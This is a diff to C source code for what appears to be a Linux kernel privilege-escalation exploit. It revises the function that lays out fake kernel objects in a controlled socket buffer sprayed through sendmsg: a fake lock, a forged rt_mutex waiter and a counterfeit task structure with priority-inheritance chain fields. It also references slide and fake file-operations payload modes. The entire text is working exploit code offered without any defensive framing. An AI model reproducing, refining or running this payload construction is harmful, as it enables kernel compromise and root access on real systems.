@@ -1079,6 +1079,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
   uintptr_t payload_base = base + SKB_DATA_DELTA;
+  size_t s2_used_end = (size_t)SKB_FRAG_BIAS +
+                       FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
+  if (payload_mode == PAGE_PAYLOAD_S2 &&
+      (s2_used_end > SKB_SEND_SIZE ||
+       (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE)) {
+    pr_error("S2 payload prefix exceeds controlled skb size end=%zu\n",
+             s2_used_end);
+    return 0;
+  }
 
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
@@ -1121,42 +1130,6 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     put32(p, LOCK_OFF + 0x00, 0);
-    if (payload_mode == PAGE_PAYLOAD_S2) {
-      /* H1A-S2 proxy-root contract: W0 is the known terminal lock/PI
-       * root and FT is a passive owner.  The sendmsg-shaped stale waiter
-       * is deliberately a childless red root ({NULL,0} iovs). */
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-
-      put64(p, W0_OFF + 0x00, 1);
-      put64(p, W0_OFF + 0x08, 0);
-      put64(p, W0_OFF + 0x10, 0);
-      put64(p, W0_OFF + 0x18, 1);
-      put64(p, W0_OFF + 0x20, 0);
-      put64(p, W0_OFF + 0x28, 0);
-      put64(p, W0_OFF + 0x30, fake_task);
-      put64(p, W0_OFF + 0x38, fake_lock);
-      put32(p, W0_OFF + 0x40, 140);
-      put32(p, W0_OFF + 0x44, 0);
-      put64(p, W0_OFF + 0x48, 0);
-      put64(p, W0_OFF + 0x50, 0);
-      put64(p, W0_OFF + 0x58, 0);
-
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-      put64(p, FAKE_TASK_OFF + 0x420, 0);
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-            fake_w0 + 0x18);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-            fake_w0 + 0x18);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, fake_task);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
-      continue;
-    }
-
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
       /* Two-level PI chain within our controlled page:
        * stale_waiter -> fake_lock (trylock OK) -> owner = fake_task
@@ -1231,6 +1204,41 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
     }
+  }
+
+  if (payload_mode == PAGE_PAYLOAD_S2) {
+    /* The sendmsg data is the controlled SKB prefix below shared_info. */
+    unsigned char *p = skb_buf + SKB_FRAG_BIAS;
+
+    put64(p, LOCK_OFF + 0x08, fake_w0);
+    put64(p, LOCK_OFF + 0x10, fake_w0);
+    put64(p, LOCK_OFF + 0x18, fake_task | 1);
+
+    put64(p, W0_OFF + 0x00, 1);
+    put64(p, W0_OFF + 0x08, 0);
+    put64(p, W0_OFF + 0x10, 0);
+    put64(p, W0_OFF + 0x18, 1);
+    put64(p, W0_OFF + 0x20, 0);
+    put64(p, W0_OFF + 0x28, 0);
+    put64(p, W0_OFF + 0x30, fake_task);
+    put64(p, W0_OFF + 0x38, fake_lock);
+    put32(p, W0_OFF + 0x40, 140);
+    put32(p, W0_OFF + 0x44, 0);
+    put64(p, W0_OFF + 0x48, 0);
+    put64(p, W0_OFF + 0x50, 0);
+    put64(p, W0_OFF + 0x58, 0);
+
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+    put64(p, FAKE_TASK_OFF + 0x420, 0);
+    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+          fake_w0 + 0x18);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+          fake_w0 + 0x18);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, fake_task);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
   }
   return 1;
 }
@@ -1462,7 +1470,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
 uintptr_t prepare_good_kernel_page(int payload_mode) {
   int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+  if (payload_mode == PAGE_PAYLOAD_S2) {
+    /* S2 is one-shot: no stale-page refresh after a failed preparation. */
+    max_attempts = 1;
+  } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
   } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
@@ -1584,10 +1595,17 @@ int s2_payload_contract_ok(void) {
     return 0;
   }
 
-  for (size_t chunk = 0;
-       chunk + (size_t)SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
-       chunk += ORDER3_SIZE) {
-    const unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+  size_t used_end = (size_t)SKB_FRAG_BIAS +
+                    FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
+  if (used_end > SKB_SEND_SIZE ||
+      (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE) {
+    pr_error("S2 contract prefix exceeds controlled skb size end=%zu\n",
+             used_end);
+    return 0;
+  }
+
+  {
+    const unsigned char *p = skb_buf + SKB_FRAG_BIAS;
     uint64_t got64;
     uint32_t got32;
 
